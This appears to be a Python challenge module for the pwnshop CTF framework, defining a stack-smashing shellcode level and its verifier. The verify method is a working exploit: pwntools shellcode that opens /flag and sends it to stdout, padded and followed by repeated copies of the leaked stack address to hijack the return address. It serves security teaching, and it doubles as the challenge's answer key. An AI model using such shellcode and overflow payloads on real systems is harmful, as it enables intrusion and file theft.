import pwnshop
import pwn

PWNSHOP_AUTOREGISTER = False

from ..babyshell import BabyShellBase


class BabyShellSmash(BabyShellBase):
    stack_shellcode = True
    call_shellcode = False
    shellcode_size = 0x1000
    allocation_size = 0xF00

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil(b"stack at ")
            addr = int(process.readuntil(b"!").strip(b"!"), 16)
            shellcode = pwn.asm(
                pwn.shellcraft.open("/flag") + pwn.shellcraft.sendfile(1, 3, 0, 1024)
            )
            shellcode = shellcode.ljust(0xF00)
            shellcode += pwn.p64(addr) * (0x100 // 8)
            process.write(shellcode)
            assert self.flag in process.readall()

LEVELS = [
    BabyShellSmash,
]
NUM_TESTING=0
DOJO_MODULE="misc"
pwnshop.register_challenges(LEVELS)
